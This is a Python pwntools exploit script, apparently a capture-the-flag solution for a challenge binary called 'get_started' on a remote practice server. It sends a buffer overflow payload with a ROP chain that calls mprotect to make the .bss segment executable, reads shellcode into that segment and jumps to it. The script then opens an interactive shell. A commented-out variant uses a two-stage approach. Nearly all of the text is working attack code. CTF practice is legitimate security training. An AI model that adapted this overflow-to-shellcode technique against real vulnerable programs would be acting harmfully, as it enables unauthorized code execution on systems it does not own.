#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',28136)
#p = process('./get_started')
elf = ELF('./get_started')
context.log_level='debug'

get_flag = 0x080489B8
main = elf.symbols['main']
mprotect = elf.symbols['mprotect']
shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux')
bss = 0x80EB000
read = elf.symbols['read']
pppr = 0x080509a5


payload = 'A' * 56 + p32(mprotect) + p32(pppr) + p32(bss) + p32(0x1000) + p32(7)
payload+= p32(read) + p32(pppr) + p32(0) + p32(bss) + p32(0x100) + p32(bss)
p.sendline(payload)
p.sendline(shellcode)

'''
payload = 'A' * 56 + p32(mprotect) + p32(main) + p32(bss) + p32(0x1000) + p32(7)
p.sendline(payload)

payload =  'A' * 56 + p32(read) + p32(bss) + p32(0) + p32(bss) + p32(0x100)

p.sendline(payload)
p.sendline(shellcode)
'''



p.interactive()
